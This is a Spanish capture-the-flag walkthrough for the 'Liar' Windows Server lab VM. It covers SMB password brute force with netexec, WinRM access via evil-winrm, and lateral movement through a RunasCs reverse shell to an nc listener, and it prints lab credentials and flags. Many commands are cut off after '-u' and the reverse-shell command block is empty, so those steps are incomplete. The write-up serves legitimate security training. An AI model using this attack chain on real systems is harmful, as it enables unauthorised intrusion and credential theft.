---
title: "🖥️ Máquina: Liar — Hacking Ético"
aliases:
  - Liar
  - liar
  - Máquina Liar
  - VM Liar
  - Writeup Liar
tags:
  - ifct0109
  - hacking-etico
  - vms
  - windows-server
  - windows
  - ctf
---

# 🖥️ Máquina: Liar

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows Server  
> **Categoría:** Windows Server  
> **Técnicas trabajadas:** Enumeración web · Fuerza bruta SMB · Enumeración con netexec · Acceso WinRM (evil-winrm) · Movimiento lateral (RunasCs)  
> **Descripción:** En esta práctica identificaremos un usuario desde el contenido de una web, realizaremos fuerza bruta SMB, enumeraremos el sistema con netexec y accederemos vía WinRM. Realizaremos un movimiento lateral a otro usuario usando RunasCs, una herramienta que soluciona las limitaciones de runas en sesiones no interactivas.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / Liar):** Ej. `10.0.0.49`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Liar tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

En máquinas Windows es habitual que el host no responda a pings por defecto. Usamos -Pn para que nmap omita el descubrimiento de host y escanee directamente los puertos:

```bash
nmap -sT -p- 10.0.0.49 -Pn
```

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49681/tcp open  unknown
```

> [!info] Resultado
> Puertos relevantes:
> · 80/tcp — HTTP, servidor web IIS.
> · 139/445/tcp — SMB, servicio de recursos compartidos de Windows.
> · 5985/47001/tcp — WinRM, servicio de administración remota de Windows. Si encontramos credenciales válidas podremos usarlo para obtener una shell con evil-winrm.
> · Los puertos altos son puertos dinámicos RPC típicos de Windows.

Escaneo detallado sobre los puertos principales:

```bash
nmap -A -p80,135,139,445,5985 10.0.0.49 -Pn
```

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows

| nbstat: NetBIOS name: WIN-IURF14RBVGV
| smb2-security-mode:
|_  Message signing enabled but not required
```

> [!info] Resultado
> El servidor web corre IIS 10.0, típico de Windows Server 2019. El nombre NetBIOS de la máquina es WIN-IURF14RBVGV. La firma SMB está habilitada pero no es obligatoria, lo que permite ciertos ataques de relay, aunque en esta práctica no los necesitaremos.

---

## 🌐 Fase 2: Enumeración web

Inspeccionamos el contenido de la web:

```bash
curl http://10.0.0.49
```

```text
Hey bro,
You asked for an easy Windows VM, enjoy it.
- nica
```

> [!info] Resultado
> La página contiene un mensaje firmado por nica, que es muy probablemente un usuario del sistema. Con este dato intentaremos un ataque de fuerza bruta sobre SMB.

---

## 🔐 Fase 3: Fuerza bruta SMB con netexec

Usamos netexec para probar contraseñas del diccionario rockyou sobre el usuario nica en el servicio SMB. La opción --ignore-pw-decoding evita errores con caracteres especiales en las contraseñas:

```bash
netexec smb 10.0.0.49 -u
```

```text
SMB  10.0.0.49  445  WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

> [!info] Resultado
> Contraseña encontrada: nica:hardcore

---

## 📡 Fase 4: Enumeración SMB con netexec

Con las credenciales obtenidas investigamos el sistema usando las distintas opciones de enumeración de netexec.

Verificamos que las credenciales son válidas y obtenemos información básica del sistema:

```bash
netexec smb 10.0.0.49 -u
```

```text
SMB  10.0.0.49  445  WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
SMB  10.0.0.49  445  WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

> [!info] Resultado
> Credenciales válidas. El sistema es Windows Server 2019 Build 17763 x64. SMBv1 está deshabilitado (buena práctica de seguridad) y la firma SMB no es obligatoria.

Listamos los recursos compartidos disponibles y los permisos que tiene nica sobre cada uno:

```bash
netexec smb 10.0.0.49 -u
```

```text
SMB  10.0.0.49  445  WIN-IURF14RBVGV  Share     Permissions  Remark
SMB  10.0.0.49  445  WIN-IURF14RBVGV  -----     -----------  ------
SMB  10.0.0.49  445  WIN-IURF14RBVGV  ADMIN$                 Admin remota
SMB  10.0.0.49  445  WIN-IURF14RBVGV  C$                     Recurso predeterminado
SMB  10.0.0.49  445  WIN-IURF14RBVGV  IPC$      READ         IPC remota
```

> [!info] Resultado
> nica solo tiene acceso de lectura a IPC$. No hay recursos personalizados ni escritura disponible. Podemos confirmar esto también con smbmap:

```bash
smbmap -u nica -p hardcore -H 10.0.0.49
```

```text
[+] IP: 10.0.0.49:445  Name: 10.0.0.49  Status: Authenticated
	Disk        Permissions  Comment
	----        -----------  -------
	ADMIN$      NO ACCESS    Admin remota
	C$          NO ACCESS    Recurso predeterminado
	IPC$        READ ONLY    IPC remota
```

Intentamos enumerar usuarios del dominio con --users, volcar hashes locales con --sam y volcar el Active Directory con --ntds. Estos comandos son parte del reconocimiento estándar en entornos Windows — probadlos y observad los resultados:

```bash
netexec smb 10.0.0.49 -u
```

```bash
netexec smb 10.0.0.49 -u
```

```bash
netexec smb 10.0.0.49 -u
```

> [!info] Resultado
> Ninguno de estos comandos devuelve información útil con el usuario nica: no tiene permisos suficientes para volcar hashes SAM ni el directorio NTDS. Son comandos que vale la pena probar siempre en entornos Windows, ya que si el usuario tuviera privilegios de administrador podrían revelar todos los hashes del sistema.

Finalmente comprobamos si nica tiene acceso a WinRM, el servicio de administración remota de Windows:

```bash
netexec winrm 10.0.0.49 -u
```

```text
WINRM  10.0.0.49  5985  WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)
```

> [!info] Resultado
> El resultado Pwn3d! indica que nica pertenece al grupo de administración remota de Windows y puede acceder vía WinRM. Usamos evil-winrm para obtener una shell interactiva:

---

## 🔑 Fase 5: Acceso con evil-winrm y flag de usuario

```bash
evil-winrm -i 10.0.0.49 -u
```

```bash
cd ..
```

```bash
dir
```

```bash
cat user.txt
```

```text
HMVWINGIFT
```

> [!info] Resultado
> Flag de usuario obtenida: HMVWINGIFT

Revisamos los privilegios y grupos del usuario actual:

```bash
whoami /all
```

```text
INFORMACIÓN DE USUARIO
win-iurf14rbvgv\nica  S-1-5-21-2519875556-2276787807-2868128514-1000

INFORMACIÓN DE GRUPO
Nombre de grupo                           Tipo           SID          Atributos
========================================= ============== ============ =========
Todos                                     Grupo conocido S-1-1-0      Habilitado
BUILTIN\Usuarios                          Alias          S-1-5-32-545 Habilitado
BUILTIN\Usuarios de administración remota Alias          S-1-5-32-580 Habilitado
NT AUTHORITY\NETWORK                      Grupo conocido S-1-5-2      Habilitado
NT AUTHORITY\Usuarios autentificados      Grupo conocido S-1-5-11     Habilitado

INFORMACIÓN DE PRIVILEGIOS
Nombre de privilegio          Descripción                                  Estado
============================= ============================================ ==========
SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```

> [!info] Resultado
> nica pertenece al grupo Usuarios de administración remota (que permite el acceso WinRM) pero no al grupo Administradores. Sus privilegios son mínimos: solo SeChangeNotifyPrivilege y SeIncreaseWorkingSetPrivilege, ninguno explotable para escalar. Necesitamos buscar otro usuario con más privilegios.

---

## ↔️ Fase 6: Movimiento lateral — descubrimiento de usuarios

Listamos los usuarios del sistema desde la shell de evil-winrm:

```bash
net user
```

```text
Cuentas de usuario de \\
-------------------------------------------------------------------------------
Administrador            akanksha                 DefaultAccount
Invitado                 nica                     WDAGUtilityAccount
```

> [!info] Resultado
> Encontramos un usuario llamado akanksha que no habíamos visto antes. Salimos de evil-winrm e intentamos obtener su contraseña por fuerza bruta:

```bash
exit
```

```bash
netexec smb 10.0.0.49 -u
```

```text
SMB  10.0.0.49  445  WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
```

> [!info] Resultado
> Contraseña encontrada: akanksha:sweetgirl. Repetimos el proceso de enumeración con este usuario para ver qué accesos tiene. Estos comandos son para que los probéis y observéis los resultados:

```bash
netexec smb 10.0.0.49 -u
```

```bash
netexec smb 10.0.0.49 -u
```

```bash
netexec smb 10.0.0.49 -u
```

```bash
netexec smb 10.0.0.49 -u
```

Comprobamos si akanksha tiene acceso a WinRM:

```bash
netexec winrm 10.0.0.49 -u
```

```text
WINRM  10.0.0.49  5985  WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:sweetgirl
```

> [!info] Resultado
> akanksha no tiene acceso directo a WinRM. Necesitamos otra forma de ejecutar comandos como este usuario. La idea es entrar con nica (que sí tiene WinRM) y desde dentro suplantarlo.

---

## 🔄 Fase 7: Movimiento lateral con RunasCs

Accedemos de nuevo con nica e intentamos ejecutar un proceso como akanksha usando runas, el comando nativo de Windows para ejecutar programas con otro usuario:

```bash
evil-winrm -i 10.0.0.49 -u
```

```bash
runas /user:akanksha cmd
```

```text
Escriba la contraseña para akanksha:
*Evil-WinRM* PS C:\Users\nica\Documents>
```

Intentamos pasar la contraseña de forma automática desde un archivo:

```bash
echo sweetgirl > pass.txt
```

```bash
runas /user:akanksha cmd < pass.txt
```

> [!info] Resultado
> Ninguna de las dos opciones funciona. El motivo es que runas requiere una sesión interactiva real con una consola TTY para leer la contraseña. Evil-winrm proporciona una sesión remota que no es completamente interactiva, por lo que runas no puede solicitar ni recibir la contraseña correctamente aunque se intente redirigir desde un archivo. Es una limitación conocida del entorno WinRM.
> Necesitamos una herramienta diseñada específicamente para este escenario.

```bash
exit
```

RunasCs es una herramienta de código abierto que reimplementa la funcionalidad de runas pero diseñada para funcionar en sesiones no interactivas como WinRM o shells de red. A diferencia del runas nativo, acepta la contraseña directamente como argumento en la línea de comandos y puede lanzar una reverse shell hacia el atacante, lo que lo hace ideal para movimiento lateral en entornos como este. Lo descargamos en Kali:

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip
```

```bash
unzip RunasCs.zip
```

Conectamos de nuevo con nica y subimos el ejecutable usando la función upload de evil-winrm:

```bash
evil-winrm -i 10.0.0.49 -u
```

```bash
*Evil-WinRM* PS C:\Users\nica\Documents> upload RunasCs.exe
```

```bash
*Evil-WinRM* PS C:\Users\nica\Documents> dir
```

> [!info] Resultado
> Confirmamos que RunasCs.exe está en el directorio. Abrimos una nueva terminal en Kali y nos ponemos a la escucha:

En una terminal separada de Kali:

```bash
nc -lvnp 9002
```

Ejecutamos RunasCs indicando el usuario, contraseña, comando a ejecutar y la IP y puerto de nuestra máquina para recibir la conexión inversa:

```bash

```

```text
listening on [any] 9002 ...
connect to [10.0.0.44] from (UNKNOWN) [10.0.0.49] 49691
Microsoft Windows [Versión 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
```

> [!info] Resultado
> Conexión recibida. Tenemos una shell como akanksha. Este usuario sí tiene acceso al escritorio del Administrador, lo que nos da la flag de root:

```bash
cd c:\users\administrador
```

```bash
dir
```

```bash
type root.txt
```

```text
HMV1STWINDOWZ
```

> [!info] Resultado
> Flag de root obtenida: HMV1STWINDOWZ

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
